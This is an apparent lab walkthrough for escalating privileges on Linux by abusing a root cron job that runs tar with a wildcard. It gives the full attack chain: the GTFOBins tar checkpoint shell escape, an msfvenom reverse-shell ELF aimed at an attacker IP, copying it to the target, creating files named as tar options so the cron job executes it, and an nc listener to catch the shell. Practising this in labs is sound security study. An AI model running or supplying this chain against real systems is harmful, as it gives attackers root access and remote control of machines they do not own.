Exploiting WildCards in CRONJOB
-------------------------------
1.
in crontab file a file is used. It is in
cat /usr/local/bin/compress.sh
(It runs with a wildcard(*) in /home/user directory )

2. In GFTOBINS page with 'tar'.
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

The tar command runs other command as checkpoint
So, we will exploit that.

3.
Now in attackbox , create a elf binary for reverseshell using msfvenom

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

4. Using scp transfer the elf file to /home/user of Debian VM.
scp shell.elf user@VM_IP:/home/user

5.In Debian VM's /home/user directory:
(a) chmod +x /home/user/shell.elf
(b) touch /home/user/--checkpoint=1
(c) touch /home/user/--checkpoint-action=exec=shell.elf
Explanation:
When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are 
valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

6. Now in attackbox start a reverse shell listener.
nc -lnvp 4444

7. Got the shell.
